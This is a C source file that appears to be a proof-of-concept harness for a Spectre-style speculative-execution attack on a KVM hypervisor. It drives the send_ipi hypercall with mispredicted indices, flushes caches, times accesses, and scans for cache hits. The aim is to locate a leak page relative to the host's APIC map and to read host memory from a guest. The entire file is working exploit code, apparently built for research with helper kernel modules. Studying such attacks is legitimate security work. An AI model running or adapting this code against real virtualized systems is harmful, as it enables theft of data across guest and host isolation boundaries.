#include <bits/time.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#include "asm.h"
#include "constants.h"
#include "hypercall.h"
#include "time_deque.h"
#include "timing.h"

int hypercall(struct send_ipi_hypercall *opts) {
  const char *hypercall_path = "/proc/hypercall/send_ipi";
  int fd = open(hypercall_path, O_WRONLY);
  if (fd < 0) {
    err(fd, "Failed to open %s", hypercall_path);
  }

  int b = write(fd, opts, sizeof(*opts));
  close(fd);
  if (b < 0) {
    err(errno, "Failed to write to %s", hypercall_path);
  }
  return b;
}

void determine_cache_eviction(void *leak) {
  const char *hypercall_path = "/proc/hypercall/measure_cache_eviction_set";
  int fd = open(hypercall_path, O_WRONLY);
  if (fd < 0) {
    err(fd, "Failed to open %s", hypercall_path);
  }

  int b = write(fd, leak, HUGE_PAGE_SIZE);
  close(fd);
  if (b < 0) {
    err(errno, "Failed to write to %s", hypercall_path);
  }
}

size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_addr) {
  // It is below the phys_map, and thus unreachable
  if (phys_page_addr < phys_map_addr) {
    return 0;
  }

  return (phys_page_addr - phys_map_addr) / 8;
}

size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters, int set_idx) {
  struct send_ipi_hypercall opts = {.real = {.mask_low = -1, .mask_high = -1, .min = 0},
                                    .mispredicted = {.mask_low = -1, .mask_high = -1, .min = idx},
                                    .ptr = buf,
                                    .cache_set_idx = set_idx};

  size_t min = -1;
  for (size_t i = 0; i < iters; ++i) {
    clflush(buf);
    size_t time = hypercall(&opts);
    min = time < min ? time : min;
  }

  return min;
}

typedef char kvm_lapic[8];
// It loops over the buffer like this, to defeat the prefetcher that might
// cause wrong hits
//
//           Page boundary                         New batch
//                ▼                                   ▼
//    ┌──┬──┬──┬──┼──┬──┬──┬──┼──┬──┬──┬──┼──┬──┬──┬──┼──┬──┬──┬──┼
//    │15│11│ 7│ 3│14│10│ 6│ 2│13│ 9│ 5│ 1│12│ 8│ 4│ 0│15│11│ 7│ 3│ ...
//    └──┴──┴──┴──┼──┴──┴──┴──┼──┴──┴──┴──┼──┴──┴──┴──┼──┴──┴──┴──┼
//     ▲                                              │
//   Base
//
size_t find_min(void *buf) {
  const uint32_t MAX_IDX = 0xffffffff;
  const int PAGES_IN_BATCH = 256;
  const int ELEMENTS_PER_PAGE = PAGE_SIZE / sizeof(kvm_lapic);

  struct time_deque t;
  time_deque_init(&t);

  const int BATCH_SIZE = PAGES_IN_BATCH * ELEMENTS_PER_PAGE;
  for (int64_t batch = 0; batch < MAX_IDX; batch += BATCH_SIZE) {
    struct timespec start_time;
    clock_gettime(CLOCK_MONOTONIC, &start_time);

    double avg_time = time_deque_average(&t);
    int64_t batches_left = (MAX_IDX - batch) / BATCH_SIZE;
    double time_left = batches_left * avg_time;

    // Print the remaining time
    fprintf(stderr, "\r%lx / %lx (%.4f%%) (%dh %.2dm %.2ds remaining)\r", batch, (uint64_t)MAX_IDX,
            (float)batch / (float)((uint64_t)MAX_IDX), (int)(time_left / 3600), (int)(time_left / 60) % 60,
            (int)time_left % 60);

    for (int64_t offset = ELEMENTS_PER_PAGE - 4; offset >= 0; offset -= 4) {
      for (int64_t page = PAGES_IN_BATCH - 1; page >= 0; --page) {
        size_t idx = batch + (ELEMENTS_PER_PAGE * page) + offset;

        size_t time = access_buffer_with_spectre(buf, idx, 1, 0);
        if (time < 220) {
          time = access_buffer_with_spectre(buf, idx, 1000, 0);
          if (time < 100) {
            printf("\nhit: %lx %ld\n", idx, time);
            return idx;
          }
        }
      }
    }
    struct timespec end_time;
    clock_gettime(CLOCK_MONOTONIC, &end_time);

    struct timespec elapsed = timespec_subtract(&end_time, &start_time);
    time_deque_push(&t, elapsed);
  }

  return 0;
}

void cmd_determine(void *leak_page) {
  *(uint64_t *)leak_page = page_value;
  getchar();
  access_buffer_with_spectre(leak_page, 1, 1, 0);
  *(uint64_t *)leak_page = 0;
}

void cmd_calc_min(int argc, char *argv[argc]) {
  if (argc <= 3) {
    errno = EINVAL;
    err(errno, "missing args, requires [leak page addr] [apic map addr]");
  }
  char *endptr = NULL;
  uintptr_t leak_page_addr = strtoull(argv[2], &endptr, 16);
  if (endptr == argv[2]) {
    errno = EINVAL;
    err(errno, "Could not parse phys addr of leak page");
  }

  uintptr_t apic_map_addr = strtoull(argv[3], &endptr, 16);
  if (endptr == argv[3]) {
    errno = EINVAL;
    err(errno, "Could not parse phys addr of apic map");
  }

  printf("Leak page addr: %lx\tAPIC map addr: %lx\n", leak_page_addr, apic_map_addr);
  size_t min = calculate_min(leak_page_addr, apic_map_addr);
  printf("Min: %ld (or 0x%lx)\n", min, min);
}

void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
  if (argc <= 2) {
    errno = EINVAL;
    err(errno, "missing args, requires min");
  }
  char *endptr = NULL;
  uintptr_t min = strtoull(argv[2], &endptr, 16);
  if (endptr == argv[2]) {
    errno = EINVAL;
    err(errno, "Could not parse min");
  }

  printf("Reading needle...\n");
  char needle[128];
  // ssize_t needle_size = read(STDIN_FILENO, needle, 128);
  // if (needle_size <= 0) {
  //   err(errno, "No l1tf needle");
  // }
  // memcpy(leak_page, needle, needle_size);
  clflush(leak_page);

  const size_t iterations = 1000;
  printf("Doing %ld iterations\n", iterations);
  for (int set_idx = 0; set_idx < 1; ++set_idx) {

    access_buffer_with_spectre(leak_page, ~min, iterations, set_idx);
    size_t hit = access_buffer_with_spectre(leak_page, min, iterations, set_idx);
    size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations, set_idx);

    printf("%d\tMiss: %ld\tHit: %ld\n", set_idx, miss, hit);
  }

  // memset(leak_page, 0, needle_size);
}

int main(int argc, char *argv[argc]) {
  struct time_deque d;
  time_deque_init(&d);

  if (argc < 2) {
    errno = EINVAL;
    err(errno, "Invalid usage");
  }

  // Spawn the leak page
  void *leak_page = mmap(NULL, HUGE_PAGE_SIZE, PROT_READ | PROT_WRITE,
                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE, 0, 0);
  if (leak_page == (void *)-1) {
    err(errno, "mmap failed");
  }

  // Use this to get physical address of the leak page with the
  // kvm_assist.ko module in the hypervisor
  if (!strcmp(argv[1], "determine")) {
    cmd_determine(leak_page);
  } else if (!strcmp(argv[1], "calc_min")) {
    cmd_calc_min(argc, argv);
  } else if (!strcmp(argv[1], "test_spectre")) {
    cmd_test_spectre(argc, argv, leak_page);
  } else if (!strcmp(argv[1], "find_min")) {
    size_t min = find_min(leak_page);
    printf("Min: %ld (or 0x%lx)\n", min, min);
  } else if (!strcmp(argv[1], "cache_evict")) {
    determine_cache_eviction(leak_page);
  }

  munmap(leak_page, HUGE_PAGE_SIZE);
  return 0;
}
